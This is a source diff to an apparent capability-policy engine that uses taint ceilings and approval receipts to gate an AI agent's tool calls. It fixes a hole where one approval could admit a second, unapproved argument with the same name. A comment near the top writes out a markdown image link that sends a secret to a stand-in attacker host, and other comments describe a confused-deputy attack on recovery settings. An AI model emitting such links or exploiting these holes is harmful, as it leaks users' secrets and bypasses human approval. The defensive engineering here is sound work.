@@ -193,7 +193,24 @@ export const CAPABILITY_POLICY: CapabilityPolicy = {
     // assumed: the rendering surface does not auto-fetch. A markdown client that resolves
     // ![](https://attacker/?secret) has turned this row into web_fetch, and then this row is wrong.
     defaultCeiling: "UNTRUSTED_EXTERNAL",
-    roleCeilings: {},
+    // RATED EXPLICITLY, and the empty object it replaced was a latent availability failure.
+    //
+    // `ceilingFor` fails closed: an unrated STEERING role clamps to USER_CONTROLLED regardless of
+    // `defaultCeiling`. That rule is right for every row that acts - forgetting to rate a role must
+    // never be the loosening - and it is wrong here, because this row cannot act. With `roleCeilings`
+    // empty and `liftableBy` empty, a `text_response` whose argument was declared `sink_identity`
+    // returned a flat DENY with no route out: the release valve refusing, on a capability that
+    // changes nothing and sends nothing. Exactly the composition that produced defect §7 on
+    // transaction_prepare, on the one row the whole design leans on.
+    //
+    // A no-effect, no-egress row has nothing for a steering value to steer, so every role is at the
+    // top of the lattice - and `validatePolicy` now REQUIRES such a row to say so, rather than
+    // leaving the next author to discover the clamp. See docs/DEFECTS_FOUND.md §12.
+    roleCeilings: {
+      sink_identity: "UNTRUSTED_EXTERNAL",
+      magnitude: "UNTRUSTED_EXTERNAL",
+      control: "UNTRUSTED_EXTERNAL",
+    },
     requiresConfirmation: false,
     liftableBy: lift(),
     approvalBoundary: "Answers the user. Performs no tool call and sends nothing outward.",
@@ -384,13 +401,16 @@ export const CAPABILITY_POLICY: CapabilityPolicy = {
     defaultCeiling: "USER_CONTROLLED",
     roleCeilings: { sink_identity: "CLEAN", control: "CLEAN" },
     requiresConfirmation: true,
-    tuplePolicies: [
-      {
-        id: "target_and_setting",
-        roles: ["sink_identity", "control"],
-        why: "which account and which setting - a recovery address is the confused-deputy pair",
-      },
-    ],
+    // NO TUPLE POLICY, and its removal in v0.8 is a correction rather than a loosening.
+    //
+    // `target_and_setting` used to sit here and could never fire. The combination gate catches values
+    // that were admitted SEPARATELY - each lifted by its own receipt, with the pair being the attack.
+    // This row's `liftableBy` is empty, so nothing is ever admitted separately and the gate was never
+    // reached. It read as protection in the table and was not any.
+    //
+    // The intent was sound and is worth restoring the day this row gains a liftable rule; until then
+    // a dead check is worse than no check, because a reader counts it. `validatePolicy` now refuses
+    // any tuple on a row with no liftable rule. See docs/DEFECTS_FOUND.md §13.
     liftableBy: lift(),
     approvalBoundary: "Changes keys, recovery, or permissions - including the ones guarding this.",
   },
@@ -487,8 +507,23 @@ export interface ReceiptEvidence {
   readonly rule: DeclassificationRule;
   readonly capability: Capability;
   readonly role: ParamRole;
-  /** The argument this receipt was issued for. A receipt is never a bearer token. */
+  /**
+   * The argument LABEL this receipt was issued for. A receipt is never a bearer token.
+   *
+   * A label alone is not an identity - see `argPath`. Kept because it is what an issuer naturally
+   * knows, and because a name that occurs once in an action IS its slot, which covers almost every
+   * real call.
+   */
   readonly argName: string;
+  /**
+   * The argument SLOT this receipt was issued for, when the issuer can say.
+   *
+   * This is the binding that actually holds. When present it must equal the slot the engine computes
+   * for the argument, so a receipt for `recipients[0]` cannot admit `recipients[1]`. When absent the
+   * receipt falls back to matching by label, and that fallback works ONLY where the label is
+   * unambiguous within the action. See docs/ARGUMENT_IDENTITY.md and defect §11.
+   */
+  readonly argPath?: string;
   /** The highest taint this receipt admits. */
   readonly lifts: Taint;
   /** The value it admits. Checked against the argument's value when the caller supplies one. */
@@ -579,14 +614,67 @@ function coverFor(
   input: DecisionInput,
   row: CapabilityRow,
   capability: Capability,
+  /**
+   * Receipts already used by an earlier argument of THIS action.
+   *
+   * A receipt binds to a slot by `(capability, role, argName)`, and until v0.8 that was believed to
+   * name exactly one slot. It does not: two arguments may share a name. Two parameters both called
+   * `url`, one allowlist receipt for one URL, and BOTH were admitted - one human approval of one
+   * value silently covering a second, arbitrary one. The reason codes even said `declassified`
+   * twice, and the ledger spent the id once because spending is idempotent, so the audit trail
+   * recorded nothing unusual.
+   *
+   * See docs/DEFECTS_FOUND.md §11.
+   *
+   * THIS IS THE v0.8 MITIGATION, kept as defence in depth. The class fix is the SLOT model above -
+   * `slotsOf`, `argPath`, and a label-only receipt matching nothing where the label repeats. This
+   * guard is now almost unreachable, because a receipt can only match one slot; it still catches the
+   * case where a caller gives two arguments the same explicit `path`.
+   *
+   * An earlier version of this comment claimed a second fix - "rejecting duplicate argument names
+   * outright" - that was never written. Nothing enforced it and nothing could have; duplicate labels
+   * are legitimate (an array parameter), which is why the fix is slots rather than a ban. Corrected
+   * in v0.9, in the same spirit as defect §6.
+   */
+  usedReceipts: ReadonlySet<ReceiptId>,
 ): { readonly covering: ReceiptEvidence | undefined; readonly rejections: readonly Reason[] } {
   const rejections: Reason[] = [];
   const spent = input.spentReceipts;
   const now = input.now;
 
   for (const r of input.receipts ?? []) {
-    // Not for this slot at all. Silent: a receipt for another argument is ordinary, not suspicious.
-    if (r.argName !== a.arg.name) continue;
+    // ---- SLOT MATCHING, and the fail-closed half is the point ----------------------------------
+    // An explicit `argPath` must equal the slot exactly: a receipt for `recipients[0]` has nothing to
+    // say about `recipients[1]`.
+    //
+    // A label-only receipt falls back to matching by name, and ONLY where that name identifies one
+    // argument. Where the label repeats, a label-only receipt matches NOTHING - not the first, not
+    // the last. Its issuer cannot have meant one rather than the other, so neither is a safe guess,
+    // and guessing is exactly how defect §11 admitted an argument nobody approved.
+    if (r.argPath !== undefined && r.argPath !== "") {
+      if (r.argPath !== a.slot) continue;
+    } else if (!a.labelIsUnambiguous) {
+      rejections.push(
+        reason(
+          "receipt_capability_mismatch",
+          `receipt ${r.id} names the label "${r.argName}", which identifies more than one argument of this action; a receipt must name a slot (argPath) to admit one of them`,
+        ),
+      );
+      continue;
+    } else if (r.argName !== a.arg.name) {
+      // Not for this slot at all. Silent: a receipt for another argument is ordinary, not suspicious.
+      continue;
+    }
+
+    if (usedReceipts.has(r.id)) {
+      rejections.push(
+        reason(
+          "receipt_already_consumed",
+          `receipt ${r.id} already admitted an earlier argument of this action; one receipt admits one value into one slot`,
+        ),
+      );
+      continue;
+    }
 
     if (spent?.has(r.id)) {
       rejections.push(
@@ -662,17 +750,22 @@ function coverFor(
  * and a DIFFERENT pair produces a different one. That is what stops a receipt for one combination
  * admitting a reordered or substituted one.
  */
+// Keyed by SLOT, not by label, since v0.9. Two arguments sharing a name produced the key "url+url",
+// under which a tuple ratified for one pair would match a different pair - defect §11's confusion at
+// the combination layer. `admitConfirmedTuple` builds the same key the same way, from
+// `argPath ?? argName`, so the two stay symmetric; where names are unique the slot IS the name and
+// nothing observable changes.
 const tupleKey = (assessments: readonly ArgAssessment[], roles: readonly ParamRole[]): string =>
   assessments
     .filter((a) => roles.includes(a.arg.role))
-    .map((a) => a.arg.name)
+    .map((a) => a.slot)
     .sort()
     .join("+");
 
 const tupleValue = (assessments: readonly ArgAssessment[], roles: readonly ParamRole[]): string =>
   assessments
     .filter((a) => roles.includes(a.arg.role))
-    .map((a) => `${a.arg.name}=${a.arg.value ?? ""}`)
+    .map((a) => `${a.slot}=${a.arg.value ?? ""}`)
     .sort()
     .join("&");
 
@@ -682,6 +775,74 @@ interface ArgAssessment {
   readonly taint: Taint;
   readonly provenance: ReadonlySet<Provenance>;
   readonly ceiling: Taint;
+  /** This argument's identity within the action. See `slotsOf`. */
+  readonly slot: string;
+  /** Whether the argument's LABEL alone identifies it. False when the name repeats. */
+  readonly labelIsUnambiguous: boolean;
+}
+
+/**
+ * Give every argument of an action a stable, unique identity.
+ *
+ * `name` is a label and labels repeat. This turns a list of possibly-repeating labels into a list of
+ * distinct slots, which is what a receipt has to bind to if "a receipt admits one value into one
+ * slot" is going to be true rather than aspirational.
+ *
+ * THE RULES, in order:
+ *   1. An explicit `path` is the slot. The caller knows their own schema; nothing here second-guesses
+ *      it.
+ *   2. A name that occurs exactly once in the action is its own slot. No ceremony for the common case.
+ *   3. A repeated name becomes `name[i]`, positionally. Deterministic, and it exists so the engine
+ *      can still tell the arguments apart - NOT so a receipt can guess which one it meant. A
+ *      label-only receipt does not match a repeated name at all.
+ *   4. If two arguments still collide - the caller gave two of them the same explicit `path` - the
+ *      later ones are suffixed so slots stay unique, and neither is matchable by label. A colliding
+ *      path is a caller bug, and the safe reading of a caller bug is that nothing is admitted.
+ *
+ * Pure and total: no throw, no clock, no allocation the caller can observe.
+ */
+export function slotsOf(args: readonly ActionArg[]): readonly string[] {
+  const nameCounts = new Map<string, number>();
+  for (const a of args) nameCounts.set(a.name, (nameCounts.get(a.name) ?? 0) + 1);
+
+  const used = new Set<string>();
+  const seenName = new Map<string, number>();
+  const out: string[] = [];
+  for (const a of args) {
+    let slot: string;
+    if (a.path !== undefined && a.path !== "") {
+      slot = a.path;
+    } else if ((nameCounts.get(a.name) ?? 0) === 1) {
+      slot = a.name;
+    } else {
+      const i = seenName.get(a.name) ?? 0;
+      seenName.set(a.name, i + 1);
+      slot = `${a.name}[${i}]`;
+    }
+    // Rule 4. Uniqueness is what the whole model rests on, so it is enforced rather than assumed.
+    let unique = slot;
+    let n = 0;
+    while (used.has(unique)) unique = `${slot}#${++n}`;
+    used.add(unique);
+    out.push(unique);
+  }
+  return out;
+}
+
+/**
+ * Whether each argument's LABEL alone identifies it.
+ *
+ * A label-only receipt is admissible only where this is true. Note it is false for BOTH arguments of
+ * a duplicated pair, not just the second: the issuer of a label-only receipt cannot have meant one
+ * rather than the other, so neither is a safe match.
+ */
+function labelUnambiguous(
+  args: readonly ActionArg[],
+  slots: readonly string[],
+): readonly boolean[] {
+  const nameCounts = new Map<string, number>();
+  for (const a of args) nameCounts.set(a.name, (nameCounts.get(a.name) ?? 0) + 1);
+  return args.map((a, i) => (nameCounts.get(a.name) ?? 0) === 1 && slots[i] === a.name);
 }
 
 /**
@@ -739,8 +900,12 @@ export function decide(
   const assessments: ArgAssessment[] = [];
   const allProvenance = new Set<Provenance>();
   let overall: Taint = "CLEAN";
+  // Identity before anything else: every later check that talks about "this argument" means a SLOT,
+  // and a slot is only computable with the whole argument list in hand.
+  const slots = slotsOf(action.args);
+  const unambiguous = labelUnambiguous(action.args, slots);
 
-  for (const arg of action.args) {
+  for (const [argIndex, arg] of action.args.entries()) {
     let taint: Taint = "CLEAN";
     const provenance = new Set<Provenance>();
     for (const from of arg.derivedFrom) {
@@ -752,12 +917,24 @@ export function decide(
       }
     }
     overall = joinTaint(overall, taint);
-    assessments.push({ arg, taint, provenance, ceiling: ceilingFor(row, arg.role) });
+    assessments.push({
+      arg,
+      taint,
+      provenance,
+      ceiling: ceilingFor(row, arg.role),
+      slot: slots[argIndex] as string,
+      labelIsUnambiguous: unambiguous[argIndex] === true,
+    });
   }
 
   // ---- the taint gate, per argument -------------------------------------------------------------
   const reasons: Reason[] = [];
-  /** Arguments that needed a receipt and got one. The tuple gate keys off this, not off presence. */
+  /**
+   * SLOTS that needed a receipt and got one. The tuple gate keys off this, not off presence.
+   *
+   * Keyed by slot rather than by name since v0.9. With names, two arguments sharing a label made the
+   * gate see one admission where there were two - the same confusion as defect §11, one layer up.
+   */
   const admittedByReceipt = new Set<string>();
   /** Receipts this decision actually used. The shell must mark these spent, atomically with acting. */
   const spent: ReceiptId[] = [];
@@ -765,11 +942,13 @@ export function decide(
 
   if (overCeiling.length > 0) {
     const unlifted: ArgAssessment[] = [];
+    // One receipt, one argument. See coverFor's `usedReceipts` parameter and DEFECTS_FOUND.md §11.
+    const usedReceipts = new Set<ReceiptId>();
     for (const a of overCeiling) {
       // Every reason a receipt might fail to cover this argument, reported rather than silently
       // skipped. A receipt that was rejected for replay looks identical, from the outside, to no
       // receipt at all - and those are very different events. The first is an adversary.
-      const { covering, rejections } = coverFor(a, input, row, action.capability);
+      const { covering, rejections } = coverFor(a, input, row, action.capability, usedReceipts);
       for (const rj of rejections) reasons.push(rj);
       if (covering !== undefined) {
         reasons.push(
@@ -778,7 +957,8 @@ export function decide(
           }),
         );
         spent.push(covering.id);
-        admittedByReceipt.add(a.arg.name);
+        usedReceipts.add(covering.id);
+        admittedByReceipt.add(a.slot);
         continue;
       }
       unlifted.push(a);
@@ -927,7 +1107,7 @@ export function decide(
   // their ceilings never reaches here, which is what keeps this from firing on ordinary traffic.
   for (const policy of row.tuplePolicies ?? []) {
     const separatelyAdmitted = assessments.filter(
-      (a) => policy.roles.includes(a.arg.role) && admittedByReceipt.has(a.arg.name),
+      (a) => policy.roles.includes(a.arg.role) && admittedByReceipt.has(a.slot),
     );
     // DISTINCT roles, not merely two arguments. A "recipient and amount" policy means one of each;
     // two separately-admitted recipients are two instances of the same question, not the combination
